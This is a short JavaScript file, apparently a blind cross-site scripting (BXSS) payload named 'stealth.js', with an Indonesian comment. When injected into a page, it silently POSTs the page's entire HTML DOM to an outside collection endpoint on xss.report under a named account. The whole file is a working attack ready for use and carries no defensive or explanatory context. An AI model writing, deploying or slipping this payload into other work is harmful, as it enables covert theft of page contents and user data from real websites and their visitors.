// stealth.js – BXSS Payload to xss.report
(function() {
  const endpoint = 'https://xss.report/c/blackchiper';

  // Kirim seluruh HTML DOM ke endpoint kamu
  fetch(endpoint, {
    method: 'POST',
    mode: 'no-cors',
    body: document.documentElement.outerHTML
  });
})();
